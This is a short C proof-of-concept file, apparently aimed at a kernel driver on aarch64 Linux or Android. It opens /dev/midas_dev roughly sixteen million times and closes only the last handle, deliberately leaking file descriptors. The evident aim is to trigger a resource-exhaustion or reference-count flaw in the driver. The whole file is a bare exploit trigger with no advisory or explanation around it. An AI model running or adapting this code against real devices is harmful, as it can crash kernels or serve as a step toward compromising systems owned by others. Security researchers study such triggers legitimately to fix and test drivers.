// aarch64-linux-gnu-gcc -static poc.c 

#include <stdio.h>
#include <fcntl.h>
#include <unistd.h>
#include <errno.h>
#include <string.h>

int main(void) {

    int fd;
    for(unsigned int i = 0; i < 0xffffff; i++) {
    fd = open("/dev/midas_dev", O_RDWR);
    if (fd < 0) {
        perror("open failed");
        continue;
    }

}
    close(fd);

return 0;
}
